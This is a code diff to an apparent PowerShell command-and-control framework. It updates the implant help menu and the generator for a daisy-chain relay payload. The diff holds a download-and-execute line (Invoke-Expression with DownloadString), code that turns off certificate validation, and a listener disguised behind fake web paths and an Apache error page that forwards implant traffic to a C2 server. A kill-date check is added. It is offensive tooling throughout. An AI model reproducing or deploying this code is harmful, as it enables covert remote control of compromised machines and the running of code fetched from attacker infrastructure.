@@ -436,7 +436,7 @@ $header = '
         write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
         write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
         write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
-        write-host " Invoke-DaisyChain -port 80 -daisyserver http://192.168.1.1 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
+        write-host " Invoke-DaisyChain -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
         write-host " Get-MSHotfixes" -ForegroundColor Green 
         write-host " Get-FireWallRulesAll | Out-String -Width 200" -ForegroundColor Green 
@@ -719,8 +719,11 @@ $fdsf = @"
 `$serverport = '$port'
 `$Server = "${c2server}:${c2port}"
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
-function Get-Webclient (`$Cookie)
-{
+function Get-Webclient (`$Cookie) {
+`$d = (Get-Date -Format "dd/MM/yyyy");
+`$d = [datetime]::ParseExact(`$d,"dd/MM/yyyy",`$null);
+`$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",`$null);
+if (`$k -lt `$d) {exit} 
 `$username = `$username
 `$password = `$password
 `$proxyurl = `$proxyurl
@@ -754,7 +757,7 @@ if (`$cookie) {
 <address>Apache (Debian) Server</address>
 </body></html>
 '
-`$URLS = '/connect',"/images/static/content/","/news/","/webapp/static/","/images/prints/","/wordpress/site/","/steam","/true/images/77/","/holidngs/images/","/daisy"
+`$URLS = "/connect","/daisy","/images/static/content/","/news/id=","/webapp/static/","/images/prints/","/wordpress/site/","/steam/","/true/images/77/static/","/holdings/office/images/"
 `$listener = New-Object -TypeName System.Net.HttpListener 
 `$listener.Prefixes.Add("http://+:`$serverport/") 
 `$listener.Start()
@@ -793,10 +796,10 @@ while (`$listener.IsListening)
         `$targetStream.Dispose()
         [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
         if (`$method -eq "GET") {
-        `$message = (Get-Webclient -Cookie `$cookiesin).DownloadString(`$Server+`$url)
+        `$message = (Get-Webclient -Cookie `$cookiesin).DownloadString("`$(`$Server)`$(`$url)")
         }
         if (`$method -eq "POST") {
-        `$message = (Get-Webclient -Cookie `$cookiesin).UploadData("`$Server`$url", `$buffer)
+        `$message = (Get-Webclient -Cookie `$cookiesin).UploadData("`$(`$Server)`$(`$url)", `$buffer)
         }
     }
     if (!`$message) {
@@ -860,8 +863,8 @@ if (!`$t) {
 }
 
 "@
-[IO.File]::WriteAllLines("$FolderPath\payloads\daisyserver.bat", $rundaisy)
-Write-Host -Object "DaisyServer bat written to: $FolderPath\payloads\daisyserver.bat"  -ForegroundColor Green
+[IO.File]::WriteAllLines("$FolderPath\payloads\daisyserver.ps1", $rundaisy)
+Write-Host -Object "DaisyServer written to: $FolderPath\payloads\daisyserver.ps1"  -ForegroundColor Green
 
 return $rundaisy
 }
